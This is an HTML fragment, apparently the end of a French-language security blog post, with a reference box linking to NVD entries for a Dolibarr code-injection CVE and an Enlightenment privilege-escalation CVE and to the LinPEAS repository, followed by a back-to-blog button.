<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Références utiles
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30253" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2023-30253 - Dolibarr PHP Code Injection
            </a>
        </li>
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37706" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2022-37706 - Enlightenment Privilege Escalation
            </a>
        </li>
        <li>
            <a href="https://github.com/peass-ng/PEASS-ng" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                LinPEAS - Privilege Escalation Awesome Scripts
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/fr/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Retour au blog
    </a>
</div>
